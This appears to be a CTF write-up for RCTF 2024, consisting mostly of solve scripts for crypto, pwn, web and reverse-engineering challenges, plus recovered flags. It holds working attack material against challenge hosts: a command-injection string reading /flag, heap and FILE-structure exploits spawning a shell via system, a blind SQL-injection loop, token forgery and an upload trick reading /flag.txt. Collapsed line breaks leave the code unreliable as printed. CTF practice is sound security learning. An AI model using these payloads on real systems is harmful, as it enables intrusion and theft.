for lllll in range(20): ru(b"your pubKey: (") pqstr=ru(b")")[:-1] pqmb=['p','q','g','y'] pqstr=pqstr.decode() print(pqstr) pqstr=pqstr.split(',') p=int(pqstr[0]) q=int(pqstr[1]) g=int(pqstr[2]) y=int(pqstr[3]) print("p=",p) print("q=",q) print("g=",g) print("y=",y) mm=[] rr=[] ss=[] for i in range(19): msg='a' mm.append(int(sha1(msg.encode()).hexdigest(), 16)) ru(b">") sl("1") ru(b"to sign?: ") sl("a") #sla("to sign?: ","a") ru(b"Signature: (") tmprs=ru(b")")[:-1].decode() tmprs=tmprs.split(',') r0=int(tmprs[0]) s0=int(tmprs[1]) rr.append(r0) ss.append(s0) aaxx=[] bbxx=[] aa0=inverse(ss[0],q)*mm[0]%q bb0=inverse(ss[0],q)*rr[0]%q for i in range(18): aatmp=(inverse(ss[i+1],q)*mm[i+1]-aa0)*inverse(4,q)%q bbtmp=(inverse(ss[i+1],q)*rr[i+1]-bb0)*inverse(4,q)%q aaxx.append(aatmp) bbxx.append(bbtmp) RR=RationalField(160) M=Matrix(RR,20,20) for i in range(18): M[0,i]=bbxx[i] M[1,i]=aaxx[i] M[2+i,i]=q M[0,18]=1/2**10 M[1,19]=2**150 res=M.LLL() print(res[0]) print(res[1]) print(res[2]) print(x,x-q,q-x,2**159) print("*"*32) for kk in res: if abs(kk[19])==2**150: print(abs(kk[19])) print(len(bin(abs(kk[0])))) print(len(bin(abs(kk[18]*2**10)))) print(kk[18]*2**10) x1=(kk[18]*2**10)%q if pow(g, x1, p)==y: print("ok"*16) print(x1) x1=int(x1) k=(mm[0]+x1*rr[0])*inverse(ss[0],q)%q r0 = pow(g, k, p) % q print(rr[0],r0,k) msgxx=b"get flag" Hm=int(sha1(msgxx).hexdigest(), 16) s=(Hm + x1 * r0) * inverse(k, q) % q print("r=",r0) print("s=",s) ru(b">") sl("2") sla(b'verify?:',"get flag") sla(b'r:',str(r0)) sla(b's:',str(s)) r.interactive() break r.close() r = remote('121.37.182.7', 10089)
#RCTF{Ev3ry_fighter_h@s_their_signature_style}


```
flag0.png：RCTFflag1.png：{??bflag2.png：a??eflag3.png：b??5flag4.png：c??5flag5.png：4??-flag6.png：0??0flag7.png：-??dflag8.png：7??2flag9.png：5??}
```



```
from PIL import Image
def read_and_write_pixels(input_path, output_path): # 打开原始图片 img = Image.open(input_path)
 # 获取图片的宽度和高度 width, height = img.size
 # 创建一个新的图片对象，与原始图片大小和模式相同 new_img = Image.new(img.mode, (width // 2, height))
 # 获取原始图片的像素数据 pixels = img.load()
 # 获取新图片的像素数据 new_pixels = new_img.load()
 # 从图像最左侧开始向右读取像素，每隔一个像素提取一个像素，并从新图片的最左侧开始写入 for x in range(0, width, 2): for y in range(height): pixel = pixels[x, y] # 读取原始图片的像素 new_x = x // 2 # 计算新图片的 x 坐标 new_pixels[new_x, y] = pixel # 将像素写入新图片
 # 保存新图片 new_img.save(output_path)
# 调用函数并传入原始图片路径和输出图片路径read_and_write_pixels("flag1.png", "flag1-1.png")
```



```
from PIL import Image
def read_and_write_pixels(input_path, output_path): # 打开原始图片 img = Image.open(input_path)
 # 获取图片的宽度和高度 width, height = img.size
 # 创建一个新的图片对象，与原始图片大小和模式相同 new_img = Image.new(img.mode, (width // 2, height))
 # 获取原始图片的像素数据 pixels = img.load()
 # 获取新图片的像素数据 new_pixels = new_img.load()
 # 从图像最右侧开始向左读取像素，每隔一个像素提取一个像素，并从新图片的最右侧开始写入 for x in range(width - 1, 0, -2): for y in range(height): pixel = pixels[x, y] # 读取原始图片的像素 new_x = width // 2 - 1 - ((width - 1 - x) // 2) # 计算新图片的 x 坐标 new_pixels[new_x, y] = pixel # 将像素写入新图片
 # 保存新图片 new_img.save(output_path)
# 调用函数并传入原始图片路径和输出图片路径read_and_write_pixels("flag1.png", "flag1-2.png")
```



```
flag0.png：RCTFflag1.png：{??b | 4、cflag2.png：a??e | 0、fflag3.png：b??5 | e、-flag4.png：c??5 | -、aflag5.png：4??- | a、3flag6.png：0??0 | d、6flag7.png：-??d | 9、3flag8.png：7??2 | 3、2flag9.png：5??} | 0、a
```



```
flag3.png：b-e5flag4.png：ca-5flag5.png：43a-flag7.png：-39d
```



```
flag0.png：RCTFflag1.png：{c4bflag2.png：af0eflag3.png：b-e5flag4.png：ca-5flag5.png：43a-flag6.png：06d0flag7.png：-39dflag8.png：7232flag9.png：5a0}flag：RCTF{c4baf0eb-e5ca-543a-06d0-39d72325a0}
```



```
niuo<SPACE>ybufmefhui<SPACE>kjqillxdjwmi<SPACE>uizebuui<SPACE><RET>dvoo<SPACE><RET>udpn<SPACE>uibuui<SPACE>jqybdm<SPACE>vegeyisi<SPACE><RET>vemeuoll<SPACE>jxysgowodmnkderf<SPACE>dbmzfa<SPACE>hkhkdazi<SPACE><RET>zvjnybufme<SPACE>hkwjdeggma<SPACE><RET>na<SPACE>mimajqueviig<SPACE><RET>kyllda<SPACE>doqisl<SPACE>ba<SPACE><RET>pnynqrpn<SPACE><RET>qrxcxxzimu<SPACE><RET>
```



```
niuo ybufmefhui kjqillxdjwmi uizebuui dvoo udpn uibuui jqybdm vegeyisi vemeuoll jxysgowodmnkderf dbmzfa hkhkdazi zvjnybufme hkwjdeggma na mimajqueviig kyllda doqisl ba pnynqrpn qrxcxxzimu
```



```
if (r1.j > 3000) { int[] arrayOfInt1; int[] arrayOfInt2; String str2; byte b2; for (arrayOfInt1 = new int[] { 164, 158, 95, 107, 4, 215, 108, 115, 5, 8, 25, 57, 41, 236, 231, 17, 85 }, arrayOfInt2 = new int[] { 246, 221, 11, 45, 127, 148, 45, 36, 70, 73, 78, 8, 98, 141, 140, 112, 40 }, str2 = "", b2 = 0; b2 < arrayOfInt1.length; ) { char c = (char)(arrayOfInt1[b2] ^ arrayOfInt2[b2]); str2 = str2 + str2; b2++; } String str1; byte b1; int[] arrayOfInt3; int[] arrayOfInt4; for (arrayOfInt3 = new int[] { 100, 174, 197, 56 }, arrayOfInt4 = new int[] { 2, 194, 164, 95 }, str1 = "", b1 = 0; b1 < arrayOfInt3.length; ) { char c = (char)(arrayOfInt3[b1] ^ arrayOfInt4[b1]); str1 = str1 + str1; b1++; } r1.d.add(new m(str1, null, str2)); } r1.d.add(new m()); r1.d.add(new m(am[4], null, Integer.toString(r1.j)));
```



```
a=[164, 158, 95, 107, 4, 215, 108, 115, 5, 8, 25, 57, 41, 236, 231, 17, 85 ]b=[246, 221, 11, 45, 127, 148, 45, 36, 70, 73, 78, 8, 98, 141, 140, 112, 40]str2 = ''for b2 in range(0,len(a)): str2 += chr(a[b2] ^ b[b2])print(str2)# RCTF{CAWCAW1Kaka}
```



```
#!/usr/bin/python3# -*- encoding: utf-8 -*-
from pwncli import *context(arch='amd64', os='linux', log_level='debug')# use script modecli_script()
# get use for obj from giftio: tube = gift['io']elf: ELF = gift['elf']libc: ELF = gift['libc']
sla(b"name:",b'cat${IFS}/flag')
#buysl(b'1')sl(b'2')
sl(b'2')sl(b'1')sl(b'1')sl(b'2')sl(b'2')
ru(b'4294966296')#buysl(b'2')sla(b">>", b'1')sla(b">>", b'1')#learnsla(b">>", b'2')sla(b">>", b'3')#dropsla(b">>", b'2')sla(b">>", b'2')
#buysla(b">>", b'2')sla(b">>", b'1')sla(b">>", b'2')#learnsla(b">>", b'2')sla(b">>", b'3')#dropsla(b">>", b'2')sla(b">>", b'2')
#buysla(b">>", b'2')sla(b">>", b'1')sla(b">>", b'3')#learnsla(b">>", b'2')sla(b">>", b'3')
sla(b">>", b'2')sla(b">>", b'1337')
ru(b'0x')system_addr=int(r(12),16)log_address_ex2(system_addr)
ru(b'0x')code_base=int(r(12),16)-0x4C950log_address_ex2(code_base)
payload=flat({ 0:code_base+0x124FF0, 40:system_addr})
sl(b'2')sl(b'1337')sl(b'2')sl(b'2')sl(b'1')sl(b'1')sl(b'3')ru(b' next visit.')sl(b'3')sl(payload)
ia()
```



```
#!/usr/bin/python3# -*- encoding: utf-8 -*-
from pwncli import *
context(arch='amd64', os='linux', log_level='debug')# use script mode# cli_script()
# get use for obj from gift#io = gift['io'] = process("wasmtime run --allow-precompiled --disable-cache --env FLAG=$FLAG ./minesweeper",shell=True)io = gift['io'] = remote("123.60.161.30", 10088)# elf: ELF = gift['elf']# libc: ELF = gift['libc']# pause()sla(b'Name', b'a' * 0x10)
sla(b'mark):', b'0 0 U')sla(b'mark):', b'0 0 u')
payload = b'yn0n' * 15 * 16sa(b':', payload)
sla(b':', b'y')sl(b'xb0')sla(b':', b'y')sl(b'x14')sla(b':', b'y')sl(b'x01')
for i in range(13): sla(b':', b'y') sl(b'x00')

ia()
```



```
#!/usr/bin/python3# -*- encoding: utf-8 -*-import base64
from pwncli import *context(arch='amd64', os='linux', log_level='debug')# use script modecli_script()
# get use for obj from giftio: tube = gift['io']elf: ELF = gift['elf']libc: ELF = gift['libc']

def add_feedback(chooice,lent,cont): sla(b"> ",b'2') sla(b"> ",str(chooice)) sla(b"How many words do you want to feedback?",str(lent)) sla(b"Please input your feedback:",cont)
def show_feedback(chooice): sla(b"> ", b'3') sla(b"> ", str(chooice))
def delete_feedback(chooice): sla(b"> ", b'4') sla(b"> ", str(chooice))
def edit_feedback(chooice,cont): sla(b"> ", b'5') sla(b"> ", str(chooice)) sla(b"Please input your feedback:", cont)

def vul(cont): sla(b"> ", b'1') sa(b"Your webp format image in base64:",cont)
add_feedback(1,0x4180,b'stas')add_feedback(2,0x20,b'stas')delete_feedback(2)add_feedback(2,0x10,b'stas')
delete_feedback(1)add_feedback(1,0x4180,b'stas')show_feedback(1)set_current_libc_base_and_log(recv_current_libc_addr(),0x21ace0)delete_feedback(1)delete_feedback(2)add_feedback(2,0x20,b'stas')add_feedback(1,0x20,b'stas')
#overwrite sizef=open("bad.webp","rb")data=f.read()payload=base64.b64encode(data)vul(payload)
show_feedback(2)ru(p64_ex(0x21))heap_base=u64_ex(r(6))&(~0xfff)log_address_ex2(heap_base)
payload=p64_ex(0x21)*6+p64_ex(libc.sym['_IO_2_1_stderr_'])+p64_ex(0x1000)edit_feedback(2,payload)

f=FileStructure()f.flags=u64_ex(" sh;")f._IO_read_ptr =0f._IO_read_end=0f._IO_read_base=libc.sym['system']f._IO_write_base=0f._IO_write_ptr=1

f._lock=libc.symbols['_IO_2_1_stderr_']-0x10f._codecvt=libc.symbols['_IO_2_1_stderr_']
f.chain=libc.sym['system']f._wide_data=libc.symbols['_IO_2_1_stderr_']-0x48
f.vtable=p64_ex(libc.symbols['_IO_wfile_jumps'])

edit_feedback(1,bytes(f))

ia()
```



```
import requestsimport string
payload = "'||love_key regexp binary '{}';-- "flag = 'RCTF{THE_FIRST_STEP_IS_TO_GET_TO_KNOW'for i in range(1,20): for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ_': print(payload.format(flag+c)) r = requests.post('http://1.94.13.174:10088/key1',data={'key1[]':payload.format(flag+c)}) # print(r.text) if 'success' in r.text: flag+=c print(flag) break
```



```
> data='{"love_time":{"a":1},"have_lovers":true}''{"love_time":{"a":1},"have_lovers":true}'> const crypto = require("crypto");undefined> > const secret = crypto.randomBytes(128);undefined> const hash = (data) => crypto.createHash("sha256").update(data).digest("hex");undefined> const userinfo = JSON.parse(data);undefined> const saltedSecret =... parseInt(Buffer.from(secret).readBigUInt64BE()) +... parseInt(userinfo.love_time);undefined> saltedSecretNaN> hash(`${data}:${saltedSecret}`)'568f9bfca86a2a8cc880deed88bd80d86a728fa5062a401a2b79262a6340e738'
```



```
POST /checklove_token=eyJsb3ZlX3RpbWUiOnsiYSI6MX0sImhhdmVfbG92ZXJzIjp0cnVlfQ%3D%3D.568f9bfca86a2a8cc880deed88bd80d86a728fa5062a401a2b79262a6340e738
```



```
from Crypto.Cipher import AESfrom Crypto.Util.Padding import padfrom Crypto.Util.Padding import unpadimport base64,timeimport requests
class AES_C(object): def __init__(self): self.key=b'88b4dbc541cd57f2d55398e9be3e61ae' self.iv=b'41cd57f2d55398e9' self.cipher=AES.new(self.key,AES.MODE_CBC,self.iv)
 def encrypt(self,text): padtext=pad(text,16,style='pkcs7') cipherText=self.cipher.encrypt(padtext) # print(padtext) # print(cipherText) return base64.b64encode(cipherText)
 def decrypt(self,b): decrypter=AES.new(self.key,AES.MODE_CBC,self.iv) cipherText = base64.b64decode(b) plaintext=decrypter.decrypt(cipherText) unpadtext=unpad(plaintext,16,'pkcs7') # print(plaintext) # print(unpadtext) return unpadtext
s = requests.Session()i = 1while i<=501: aes_c = AES_C() rangeNum = str((i+1)*(i+1)).encode() print(rangeNum) range = aes_c.encrypt(rangeNum) try: r = s.post("http://124.71.164.28:10088/final/game.php",data={ "action":"3wrg4Ich1RsKFUUPmU0vlw==", "rangeNum":range }) print(r.json()['data']) time.sleep(2) r = s.post("http://124.71.164.28:10088/final/game.php",data={ "action":"s03/Zr+K7nTxLc2aiHJQcg==", "pos":r.json()['data'] }) print(r.text) i += 1 except: print('error') continue
r = s.post("http://124.71.164.28:10088/final/game.php",data={ "action":"IMYZakV42qGIPRWdg/WfFg=="})print(r.text)
```



```
else if($action === "checkImage"){ try { $upload_image = file_get_contents($_FILES["image"]["tmp_name"]); echo getimagesize($upload_image); }catch (Exception $e){ echo "something wrong"; }
}
```



```
elif self.verb == Verb.POST: files = {'image':('/flag.txt',merged_data['image'])} if self.json_input: requ = self.session.post(self.target, json=merged_data) else: requ = self.session.post(self.target, data={"action":"xEt6B2i+YJdcrJ/RG3Ie4Q=="},files=files) return requ
```



```
from Crypto.Util.number import long_to_bytesimport claripy
inp = [claripy.BVS(f"inp_{i}", 64) for i in range(3)]
v23 = inp[0]v24 = inp[1]v25 = inp[2]v20 = (v24 & v23)v19 = ((v24 & v23 | v25 & v23) + 65670)v18 = ((v25 & v23 ^ v25 & v24) - 1131796)v17 = (v24 & v23 ^ v25 & v23)
s = claripy.Solver()s.add((v23 ^ (v20 & ~v18 | v20 & ~v19 | v17 & v19 | v25 & v23 & ~v18)) == 0x400010000622000)s.add((v18 ^ (v19 - v20)) == 0x2100A0203EFBB8B)s.add((v17 ^ v19 ^ v20) == 0x4083102108E)s.add((v19 ^ v17) - v18 == 0x1551566F3C6485ED)s.add((v18 ^ v19 ^ v25 & v24) == 0x40836ECAB9A)s.add((v17 ^ v20) - v18 == 0x3E51566F3C718563)s.add((v23 - v24) == 0x1AEFF6FDFC121BF1)s.add((v25 + v24 + v23) % 10 == 8)
for i in range(len(inp)): for j in range(8): s.add((inp[i] >> (j*8)) & 0xff <= 125) s.add((inp[i] >> (j*8)) & 0xff >= 65)
print(s.check_satisfiability())

def rev(s): inp = "abcdefghijklmnopqrstuvwx" inp_tree2_pos = "qopmukwlfcrveisaxbtdjgnh" flag = [0]*len(s) for i in range(len(s)): flag[inp.index(inp_tree2_pos[i])] = ord(s[i]) return bytes(flag)

for i in s.batch_eval(inp, 2000): s = "" for ii in i: s += (long_to_bytes(ii)[::-1].decode()) res = rev(s).decode() if res.startswith("RCTF{") and res.endswith("}"): print(res)
```



```
from Crypto.Util.number import *import gmpy2from hexdump import hexdump
n = bytes_to_long(bytes.fromhex('3F68386D7C52FBB3DFE3CCACC3DCFD1BA66CAAC7A5FC040F7CC0E55BF1ABEB92330BA492AC81084791CBD70B97A545A1CF9D0CC87E159C286964B906955C798830D36F18DCB003B8B477CE3E5AB1576C5484A6F6D1D79718BDA50BDC3C1A5910DFE6F0DC90080B3F2913C2419FDA4691ED6D7C2A3E7CF92C3FCD60D5560368E901')[::-1])e = bytes_to_long(bytes.fromhex('C5B38CCE2D27139C5B552C93F8FE3D6CFB2B03F70E27BC80BBD178C991E910DB553A6329636B74B4106FC209CBFB6B00434F03B2D9B7EE0CE2F816D14F68BEAE891CA3AE6C1F13772F1C9D2F4854BB9AD81250EE1E1D3A4039144710814911A24B1A9D59ED9F04A256632D7ECED4AA3FBBB962CDB9047FDF83A904F6D6892D24')[::-1])# boneh_durfeed = 24148649361037793876488182229470214987409054478429360732252558238236696170653
print(f'{n=}')print(f'{e=}')

def a_xor(buf, key, start, size): for i in range(size): buf[start+i] ^= key
def a_sub(buf, key, start, size): for i in range(size): buf[start+i] = (buf[start+i]-key)&0xFF
def a_add(buf, key, start, size): for i in range(size): buf[start+i] = (buf[start+i]+key)&0xFF
buf = bytearray.fromhex('45 AB BD BE AF AB 46 46 27 5D 88 99 9E 71 7E 98 00 92 97 6A 23 7F 7B 57 CC 6D 64 78 E0 61')
a_xor(buf, 8, 0, len(buf))a_xor(buf, 0x80, 0x1C, 1)a_add(buf, 0xBE, 0xF, 5)a_xor(buf, 8, 0, len(buf))a_xor(buf, 0x44, 0x14, 1)a_xor(buf, 0x80, 0x18, 1)a_sub(buf, 0xEF, 0xD, 6)a_xor(buf, 0x80, 0x10, 1)a_xor(buf, 0x44, 0x13, 1)a_add(buf, 0xBE, 10, 5)a_sub(buf, 0xEF, 0x5, 6)a_add(buf, 0xBE, 1, 5)a_xor(buf, 8, 0, len(buf))
hexdump(buf)
print(buf)
c = bytes_to_long(buf[::-1])m = pow(c, d, n)print(long_to_bytes(m)[::-1].hex())
# ComputerHKEY_CURRENT_USERSOFTWAREDrAkira# MyKeys 962d82971fb182b70e3a6d493a58133a779aa22947cf8d4b0c69b81846ed24daf4341e21f1ecfdf01687a1ff0dba88af2e331ec4c0d26a5e3d49a94b50ec9c11d484db1bae528a4ec1112b604e567b7e39badec7742097e438f890027050897a667de1418d1e3b48ff83087c61193b56b07b8b03d5503d8205a096a1e1136533
# RCTF{Dragon_Nest_Raja_And_Me}
```



```
from pwn import *import numpy as np

exe = './2048'# context.terminal = ['wt.exe', 'wsl.exe', 'bash', '-c']context.binary = ELF(exe, False)binary: ELF = context.binary# libc: ELF = ELF('./libc.so.6', False)
REMOTE = args.REMOTE or 1if REMOTE: p = remote('1.94.104.104', 10088)else: p = process(exe)sd, sa, sl, sla = p.send, p.sendafter, p.sendline, p.sendlineafterrn, rl, ru, ia = p.recvn, p.recvline, p.recvuntil, p.interactive

def parse_board(board_string): lines = board_string.strip().split("n") board = [] for line in lines: if "|" in line and '·' in line or any(char.isdigit() for char in line): row = [] # Skip the first and last empty splits cells = line.split("|")[1:-1] for cell in cells: cell = cell.strip() if cell == "·": row.append(0) elif cell.isdigit(): row.append(int(cell)) else: row.append(0) if row: board.append(row) return board

def move_left(board): new_board = [] for row in board: new_row = [num for num in row if num != 0] for i in range(len(new_row) - 1): if new_row[i] == new_row[i + 1]: new_row[i] *= 2 new_row[i + 1] = 0 new_row = [num for num in new_row if num != 0] new_row += [0] * (len(row) - len(new_row)) new_board.append(new_row) return np.array(new_board)

def move_right(board): return np.array([row[::-1] for row in move_left(board[::-1])])

def move_up(board): return move_left(board.T).T

def move_down(board): return move_right(board.T).T

def heuristic_score(board): empty_cells = len(np.where(board == 0)[0]) max_tile = np.max(board) return empty_cells + np.log2(max_tile)

def get_best_move(board): moves = { 'a': move_left(board), 'd': move_right(board), 'w': move_up(board), 's': move_down(board) } max_score = -1 best_move = None for move, new_board in moves.items(): if not np.array_equal(new_board, board): score = heuristic_score(new_board) if score > max_score: max_score = score best_move = move return best_move

def get_char(arr): board = np.array(arr) best_move = get_best_move(board) return best_move
def check_around(board, x, y, dx, dy): x1 = x+dx y1 = y+dy if x1 < 0 or x1 > 3: return False if y1 < 0 or y1 > 3: return False return board[y][x] == board[y1][x1]
def ready2win(board): for y in range(4): for x in range(4): if board[y][x] == 1024: if check_around(board, x, y, -1, 0): return True, 'd' if check_around(board, x, y, +1, 0): return True, 'd' if check_around(board, x, y, 0, -1): return True, 's' if check_around(board, x, y, 0, +1): return True, 's' return False, None

def read_raw_board(): r = b'' for i in range(4): rl() rl() rl() r += rl() return r.decode()

def add_game(): sla(b"3. exitn", b"1") sla(b"to win: ", b"1") sla(b"or r n", b'S')

for i in range(500): print(f'radding', i, end='') add_game()
for i in range(11): print('iii', i) sla(b"3. exitn", b"1") sla(b"to win: ", b"1") for j in range(50): print('JJJJJJ', j) msg = rl() # print(msg) if b'OVER' in msg: print('GG') exit(0) if b'win' in msg: exit(0) r = read_raw_board() # print(r) tmp = [] res = parse_board(r) for k in res: tmp.append(k) move = get_char(tmp) # print('move:', move) sla(b"or r n", move.encode()) ru(b"or r n") sla(b"or r n", b'S')
# ia()ru(b'your current score: ')score = int(ru(b'n', True))print(f'{score=}')sla(b"3. exitn", b"1")sla(b"to win: ", str(score).encode())
while True: msg = rl() print(msg) if b'OVER' in msg: print('GG') exit(0) if b'win' in msg: exit(0) r = read_raw_board() print(r) tmp = [] res = parse_board(r) for i in res: tmp.append(i) _ready2win, _move = ready2win(tmp) print(f'{_ready2win=}') if _ready2win: break move = get_char(tmp) print('move:', move) sla(b"or r n", move.encode()) ru(b"or r n")
if _ready2win: sla(b"or r n", b'S')# 511# input('input >>> ')# context.log_level = 'DEBUG'while True: sla(b"3. exitn", b"2") sla(b"load index: ", b"511") sla(b"or M(Menu) n", _move.encode()) ru(b"or M(Menu) n") msg = rl() score = int(msg[5:-5]) print(msg) if score > 1000000: break res = ru(b"you win!n", timeout=5) # print(res) add_game()
sla(b"3. exitn", b"3")ia()
```



```
from Crypto.Cipher.ARC4 import ARC4Cipher
enc_flag = bytes([0x80, 0x05, 0xE3, 0x2F, 0x18, 0x2F, 0xC5, 0x8C, 0x25, 0x70, 0xBC, 0x05, 0x1C, 0x4F, 0xF2, 0x02, 0xE5, 0x3E, 0x02, 0x2F, 0xE5, 0x11, 0xA3, 0xC0, 0x00])
key = bytes.fromhex('4B 8A A9 E1 99 28 4D 4B 22 B7 BD 8D 5A 49 35 00 63 B6 C5 6B 61 94 A5 03 06')enc_flag = [enc_flag[i] ^ key[i] for i in range(25)]
for i in range(25): enc_flag[i] = ((enc_flag[i]>>6)|(enc_flag[i]<<2))&0xFF
enc_flag = [x ^ 0x7D for x in enc_flag]print(bytes(enc_flag[:-1])+b'}')
# RCTF{a_baby_debug_bloker}
```



```
import check_secret
"""check_secret.map'add':<built-in function algorithm1>'sub':<built-in function algorithm2>'mul':<built-in function algorithm3>'div':<built-in function algorithm4>'mod':<built-in function algorithm5>'rsl':<built-in function algorithm6>'rsr':<built-in function algorithm7>'xor':<built-in function algorithm8>"""

def hook_add(a, b): res = check_secret.algorithm1(a, b) print(f'0x{res:08x} = 0x{a:08x} + 0x{b:08x}') return res

def hook_sub(a, b): res = check_secret.algorithm2(a, b) print(f'0x{res:08x} = 0x{a:08x} - 0x{b:08x}') return res

def hook_mul(a, b): res = check_secret.algorithm3(a, b) print(f'0x{res:08x} = 0x{a:08x} * 0x{b:08x}') return res

def hook_div(a, b): res = check_secret.algorithm4(a, b) print(f'0x{res:08x} = 0x{a:08x} / 0x{b:08x}') return res

def hook_mod(a, b): res = check_secret.algorithm5(a, b) print(f'0x{res:08x} = 0x{a:08x} % 0x{b:08x}') return res

def hook_rsl(a, b): res = check_secret.algorithm6(a, b) print(f'0x{res:08x} = 0x{a:08x} << 0x{b:08x}') return res

def hook_rsr(a, b): res = check_secret.algorithm7(a, b) print(f'0x{res:08x} = 0x{a:08x} >> 0x{b:08x}') return res

def hook_xor(a, b): res = check_secret.algorithm8(a, b) print(f'0x{res:08x} = 0x{a:08x} ^ 0x{b:08x}') return res

check_secret.map['add'] = hook_addcheck_secret.map['sub'] = hook_subcheck_secret.map['mul'] = hook_mulcheck_secret.map['div'] = hook_divcheck_secret.map['mod'] = hook_modcheck_secret.map['rsl'] = hook_rslcheck_secret.map['rsr'] = hook_rsrcheck_secret.map['xor'] = hook_xor
"""enc:[1386864498, 2877138732, 1628978326, 881564191, 1437614165, 4227562200, 1606883458, 3679355295][KEY2] haha:[1272471749, 2262110437, 697301573, 1088211398]map:{'add': <function hook_add at 0x7f4f934401f0>, 'sub': <function hook_sub at 0x7f4f934415a0>, 'mul': <function hook_mul at 0x7f4f93441bd0>, 'div': <function hook_div at 0x7f4f93440d30>, 'mod': <function hook_mod at 0x7f4f934413f0>, 'rsl': <function hook_rsl at 0x7f4f934412d0>, 'rsr': <function hook_rsr at 0x7f4f934411b0>, 'xor': <function hook_xor at 0x7f4f93441090>}sbox:[12, 17, 10, 6, 5, 27, 31, 15, 11, 8, 13, 21, 24, 1, 26, 22, 9, 16, 18, 25, 29, 19, 0, 3, 7, 14, 30, 4, 23, 2, 28, 20][KEY1] xixi:[3540658286, 3391361277, 1321275334, 3918321625]"""
# check_secret.sbox = list(range(32))# print(check_secret.check('00001111222233334444555566667777'))print(check_secret.encrypt([0x36363636, 0x37373737], check_secret.xixi))
```



```
from ctypes import c_uint32import struct
key1 = [3540658286, 3391361277, 1321275334, 3918321625]key2 = [1272471749, 2262110437, 697301573, 1088211398]delta = 0x12345678
def tea_enc(v, key): y, z = c_uint32(v[0]), c_uint32(v[1]) _sum = c_uint32(0) for i in range(32): y.value += ((z.value<<4) + key[0]) ^ (z.value + _sum.value) ^ ((z.value>>5) + key[1]) _sum.value += delta z.value += ((y.value<<4) + key[2]) ^ (y.value + _sum.value) ^ ((y.value>>5) + key[3]) # print(f'r:{i} 0x{y.value:08x} 0x{z.value:08x}') return [y.value, z.value]
def tea_dec(v, key): y, z = c_uint32(v[0]), c_uint32(v[1]) _sum = c_uint32(delta*32) for i in range(32): z.value -= ((y.value<<4) + key[2]) ^ (y.value + _sum.value) ^ ((y.value>>5) + key[3]) _sum.value -= delta y.value -= ((z.value<<4) + key[0]) ^ (z.value + _sum.value) ^ ((z.value>>5) + key[1]) # print(f'r:{i} 0x{y.value:08x} 0x{z.value:08x}') return [y.value, z.value]
enc = [1386864498, 2877138732, 1628978326, 881564191, 1437614165, 4227562200, 1606883458, 3679355295]pt = b''for i in range(0, len(enc), 2): v0, v1 = tea_dec(enc[i:i+2], key2) v0, v1 = tea_dec([v0, v1], key1) pt += struct.pack('<2I', v0, v1)sbox = [12, 17, 10, 6, 5, 27, 31, 15, 11, 8, 13, 21, 24, 1, 26, 22, 9, 16, 18, 25, 29, 19, 0, 3, 7, 14, 30, 4, 23, 2, 28, 20]_pt = b''for i in range(len(pt)): _pt += bytes([pt[sbox.index(i)]])print(_pt)
```



```
from Crypto.Cipher.ARC4 import ARC4Cipherfrom hashlib import md5
rc4 = ARC4Cipher(b'RCTF_2024_fighting')xorkey = rc4.encrypt(b'x00'*36)
data = bytearray.fromhex('31 11 B9 FD D4 41 0C AD 59 0A A2 5C F9 47 D8 0D 4C C8 60 80 CF E1 87 F9 67 22 86 05 EB 2A EB E6 A2 B4 EE 53')for i in reversed(range(len(data))): data[i] = data[i] ^ data[(i-1)%len(data)] ^ xorkey[i%len(xorkey)]print(data)
T = b'0123456789abcdefghijklmnopqrstuvwxyz'S = b''
data1 = bytearray.fromhex(''' 73 16 6f 0e 7e 0a 6e 18 28 43 2c 4e 29 11 6b 06 6f 05 31 03 65 09 71 04 77 05 30 01 69 5f 2e 1d 24 47 29 1e ''')
for i in range(0x100): _data = data1.copy() key = i for i in range(len(data1)): _key = _data[i] _data[i] ^= key key = _key if bytes(sorted(_data)) == T: print(_data) S = b'weyaptdv0kobg8zmij42flxusr51h6q39cn7' break
def inv_sbox(buf): out = bytearray(len(buf)) for i in range(len(S)): out[T.index(S[i])] = buf[i] return out

for i in range(0x100): _data = data.copy() key = i for i in range(len(data)): _key = _data[i] _data[i] ^= key key = _key _data = inv_sbox(_data) if md5(_data).hexdigest() == 'c67186f87422544aaac6844eda5c25e8': print(_data)
```



```
b = bytearray(open('./re2', 'rb').read())
for i in range(0x2188, 0xA2348): if b[i] == 0x2F and b[i+1] and b[i+2] == 0x00: print(hex(i)) for j in range(b[i+1]): b[3+i+j] = 0x96
open('./re2_patch', 'wb').write(b)
```



```
gimli::Operation::Skip { target } => { println!("// Skip {}", target); writeln!(w, "// Skip {}", target)?; } gimli::Operation::Bra { target } => { let val1 = stack.pop().unwrap(); println!("// Bra {} {}", target, val1); writeln!(w, "// Bra {} {}", target, val1)?; } gimli::Operation::Nop { } => { }
```



```
console.log('script loaded')
var base = Module.findBaseAddress("libgcc_s.so.1")console.log('base', base);
var count1 = 0;var count2 = 0;
// Interceptor.attach(base.add(0x16111), {// onEnter: function (args) {// console.log('SHL', count1, this.context.r9, this.context.rcx);// count1 += 1;// }// });
function hook() { Interceptor.attach(base.add(0x16100), { onEnter: function (args) { let v0 = BigInt(ptr(this.context.r9).toString(10)) let v1 = BigInt(ptr(this.context.r8).toString(10)) let v2 = ptr((v0+v1).toString(10)); if (this.context.r8.equals(ptr(0x9E3779B9))) { console.log(' ADD', v2, '=', this.context.r9, '+', this.context.r8); } } }); // Interceptor.attach(base.add(0x16148), { // onEnter: function (args) { // let v0 = BigInt(ptr(this.context.r9).toString(10)) // let v1 = BigInt(ptr(this.context.r8).toString(10))
 // let v2 = ptr((v0^v1).toString(10)); // console.log(' XOR', v2, '=', this.context.r9, '^', this.context.r8); // } // });}

// hook();Interceptor.attach(base.add(0x16132), { onEnter: function (args) { // if (count2 == 120) { // hook(); // } if (count2 > 120) { console.log('SHR', count2, this.context.r9, this.context.rcx); } count2 += 1; }});
```



```
from ctypes import c_uint64import struct
key1 = [11, 22, 33, 44]delta = 0x9E3779B9
def tea_enc(v, key): y, z = c_uint64(v[0]), c_uint64(v[1]) _sum = c_uint64(0) for i in range(32): _sum.value += delta if i >= 30: _sum.value += 1 #print(f'round:{i} _SUM 0x{_sum.value:08X} z 0x{z.value:08x}') print(f'round:{i} z 0x{z.value:08x}') y.value += ((z.value<<4) + key[0]) ^ (z.value + _sum.value) ^ ((z.value>>5) + key[1]) print(f'round:{i} y 0x{y.value:08x}') z.value += ((y.value<<4) + key[2]) ^ (y.value + _sum.value) ^ ((y.value>>5) + key[3]) # print(f'round:{i} 0x{y.value:08x} 0x{z.value:08x}') return [y.value, z.value]
